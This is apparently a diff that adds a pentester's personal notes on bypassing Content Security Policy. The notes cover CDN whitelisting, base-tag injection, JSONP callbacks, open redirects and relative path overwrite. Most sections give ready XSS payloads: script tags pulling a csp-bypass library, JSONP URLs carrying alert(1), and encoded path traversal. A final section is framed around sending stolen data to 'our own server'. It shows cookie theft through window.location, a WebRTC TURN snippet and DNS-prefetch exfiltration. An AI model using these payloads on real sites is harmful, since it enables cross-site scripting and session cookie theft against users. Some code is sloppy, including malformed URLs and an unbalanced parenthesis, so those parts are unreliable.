@@ -1,0 +1,200 @@
+Common CSP Bypasses: 
+CSPs can be configured to a companies specific specifications and thus they will be different among our targets. This can be a good thing because some CSPs will be weak. 
+
+Also be sure to look at the **CSP BYPASS website thats bookmarked**
+
+BYPASS 1: WHITELISTED DOMAINS
+If we encounter a CSP for a company that uses scripts from some common CDN we very well may see something like this: 
+<meta http-equiv="Content-Security-Policy" content="script-src https://unpkg.com/">
+
+This means that all scripts on unpkg.com can run on their website. Smart hackers knew this and uploaded their own libraries to unpkg called "csp-bypass" 
+this resource can be found here: https://github.com/CanardMandarin/csp-bypass
+
+This is a very common config. For example if a webpage is using react and loading it from unpkg they should have https://unpkg.com/react@16.7.0/ as their script-src attribute. Devs often get lazy or are not away of the ramifications of just putting the top level domain. Anytime we see a similar configuration we should test for it according using the libraries hackers have added to the csp again see the GitHub for details. These bypasses can work even if unsafe-eval is not allowed in the CSP. Heres an example of an injection (note it uses sval (safe eval which is not actually safe and not covered by CSP): 
+
+<script src="https://unpkg.com/csp-bypass@1.0.2-0/dist/sval-classic.js"></script>
+<br csp="alert(1)">
+
+This library works if unpkg or jsdeliver are allowed in the CSP. 
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+BYPASS 2: VIA <BASE> ELEMENT
+Many CSPs are configured to use a nonce preventing scripts without it from running. 
+
+The base tag is used to denote the base path for all relative url paths in the website. This tag is trusted when default-src is used.
+
+
+All CSPs that have default-src as an attribute must have a <base> tag or it will fail. heres can example that would fail (Note that 'script-src-elem' was not explicitly set (this derective specifies valid resources for <script> elems), so 'script-src' is used as a fallback.): 
+<head>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'nonce-abc123';">
+</head>
+<body>
+    <div id=userContent>
+      <script src="https://example.com/my.js"></script>
+    </div>
+    <script nonce=abc123 src="app.js"></script>
+</body>
+
+
+This is a regular, working default-src CSP with a base tag: 
+<head>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'nonce-abc123';">
+</head>
+<body>
+    <div id=userContent>
+      <base href="https://example.com/">
+    </div>
+    <script nonce=abc123 src="app.js"></script>
+</body>
+
+The solution to prevent this bypass is to add the base-uri rule in CSP. For example, use base-uri 'none' to block all base tags. Since most websites do not need to use <base>, you can confidently add this directive.
+
+**So if we can inject a base tag we can specify a domain that we want to allow to call scripts. we can also make all onsite liks redirect to a domain we choose**
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+BYPASS 3: Via JSONP
+
+LOTS OF PAYLOADS AVAILABLE FOR THIS (for many different potentially whitelisted domains)! 
+
+JSONP is a way to retrieve data from different origins, but I personally consider it as an old workaround that emerged before CORS matured.
+
+Browsers usually prevent CORS as we know. HOWEVER there are many HTML elements that are not subject to the same-origin-policy. An example of this would be <img> (and i think <link>). After all, images can be loaded from various sources, and we cannot access their content with JavaScript, so there is no issue.
+
+<script> is also unrestricted. for example we can add an arbitrary src to our script tag and it is not restricted by the browser / SOP. 
+
+Due to this a method for data exchange emerged. Suppose there is an API that provides user data, and they offer a path like https://example.com/api/users. Instead of returning JSON, it returns a piece of JavaScript code like this: 
+setUsers([
+  {id: 1, name: 'user01'},
+  {id: 2, name: 'user02'}
+])
+As a result the website can receive this data by using the setUsers function like so: 
+<script>
+  function setUsers(users) {
+    console.log('Users from api:', users)
+  }
+</script>
+<script src="https://example.com/api/users"></script>
+
+In reality we dont see hardcoded function names like what is shown in this example. This would most open come as a parameter like this: https://example.com/api/users?callback=anyFunctionName
+
+If this URL param is not properly validated we could potneitally add arbitrary characters right into a JavaScript function resulting in XSS. something like this: https://example.com/api/users?callback=alert(1);console.log would work in this context as shown below: 
+alert(1);console.log([
+  {id: 1, name: 'user01'},
+  {id: 2, name: 'user02'}
+])
+
+**************
+This would then bypass the CSP. Again this particular method is not used super super often with the increased use of CORS but it should remind us to check all params and most importantly find the context of each URL param were testing. We dont normally test w/ simple "alert()" payloads but sometimes this is all it takes. Take the time when testing to see the context were being dropped into. All params/vals we can control should be tested like this on our targets. Any param could be vulnerable on any domain.
+*******************
+
+this can happen in when in whitelisted cdns or scripts that use JSONP for example is www.google.com is allowed for something like the google analytics or recaptcha script. This domain could also have a url that supports JSONP so we could inject a <script> w/ the src pointing to the whitelisted domain w/ our payload attached to it. This could like:   
+<head>
+  <meta http-equiv="Content-Security-Policy" content="script-src https://www.google.com https://www.gstatic.com">
+</head>
+<body>
+  <div id=userContent>
+    <script src="https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//"></script>
+  </div>
+</body>
+IF we did this we would be able to bypass the CSP. A way to protect against this is just to be more specific w/ the domains that are whitelisted. 
+
+********THE CSP EVALUATOR WEBSITE (BOOKMARKED) WILL AUTOMATICALLY DETECT THIS AND TELL US IF ANY WHITELISTED DOMAINS SUPPORT JSONP THIS IS A HUGE ADVANTAGE WHEN TRYING TO BYPASS CSP. I belive the csp bypass site will also have payloads in it that take advantage of similar approached.***********
+AGAIN BE SURE TO LOOK AT THE CSPbypassJSONP payload list we created. 
+
+LIMITATIONS OF JSONP:
+websites often limit the chars allowed in the callback param. These could be limited to just a-zA-Z so we can call only a single function. there are some ways to still get useful functionality for example if there is a button on the page that invokes some sort of interesting action we could use a callback param like: ?callback=document.body.firstElementChild.nextElementSibling.click  to click the button and cause some sort of damage. this type of thing is called SOME (Same Origin Method Execution). This is what enables us to call functions within the JSONP param we injected. 
+
+There are many restrictions using this method but this is still a good vector. For example people used this type of CSP bypass method to call the JS to install a malicious wordpress plugin that could then also be hacked. This specific vector required a quite long code snippit that just called fistElementChild and nextElementSibling until it got to the desired button very interesting stuff. 
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+BYPASS 4: VIA REDIRECTION: **VERY INTERESTING**
+If the redirection leads to an origin that is not allowed our injection will still fail. However, if we redirect to a different path it can be used to bypass the original CSP restrictions. This method takes advantage of open redirects. 
+
+Here is an example: 
+<head>
+  <meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
+</head>
+<body>
+  <div id=userContent>
+    <script src="https://https://www.google.com/test"></script>
+    <script src="https://https://www.google.com/a/test"></script>
+    <script src="http://localhost:5555/301"></script>
+  </div>
+</body>
+
+the first 2 scripts would fail since they are not allowed by the csp. However, the final http://localhost:5555/301 will be redirected on the server-side to https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//. Since it is a redirection, the path is not considered, and the script can be loaded, thus bypassing the path restriction. With this redirection, even if the path is specified completely, it will still be bypassed. Therefore, the best solution is to ensure that the website does not have any open redirect vulnerabilities and that there are no domains that can be exploited in the CSP rules.
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+BYPASS 5: VIA RPO(relative path overwrite) **ALSO VERY USEFUL**
+In addition to the aforementioned redirection to bypass path restrictions, there is another technique called Relative Path Overwrite (RPO) that can be used on some servers.
+
+For example, if CSP allows the path https://example.com/scripts/react/, it can be bypassed as follows:
+
+<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
+
+basically a path traversal to get xss. This can be used w/ the common cdn xss payloads mentioned earlier (and bookmarked). So even if a specific path is used in the CSP config we can still bypass this to get XSS using path traversals and those cdn library xss payloads. 
+
+Not all servers do decode these into a normal path but mnay certainly will. 
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+OTHER BYPASS TECHNIQUES: ***HOW TO EXPORT/ TRANSMIT STOLEN DATA TO OUR OWN SERVER***
+This section will detail how to bypass the limitations of the CSP itself. 
+
+Suppose we have a strict CSP but it allows unsafe-inline like this: 
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline';">
+
+How would we steal document.cookie, and more importantly send it to ourselves so we can use it? In this case the CSP blocks the loading of all external resources, whether it's <img>, <iframe>, fetch(), or even navigator.sendBeacon, they will all be blocked by CSP. 
+
+In this case, there are several ways to transmit the data. One way is to use window.location = 'https://example.com?q=' + document.cookie to perform a page redirect to our own server w/ the cookie as the param. Currently, there are no CSP rules that can restrict this method, but in the future, a rule called navigate-to may be introduced.
+
+The second method is to use WebRTC, and the code is as follows (from WebRTC bypass CSP connect-src policies #35):
+
+var pc = new RTCPeerConnection({
+  "iceServers":[
+      {"urls":[
+        "turn:74.125.140.127:19305?transport=udp"
+       ],"username":"_all_your_data_belongs_to_us",
+      "credential":"."
+    }]
+});
+pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
+Again there is no CSP rule to defend against this but one may be added called webrtc. 
+
+The third method is DNS prefetch: <link rel="dns-prefetch" href="https://data.example.com">. By treating the data you want to send as part of the domain, you can transmit it through DNS queries. **if using interactsh i dont think we could do this as a subdomain we would have to try appeneding it to the path???
+
+Although default-src seems to block all external connections, it is not the case. There are still some magical ways to transmit data.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
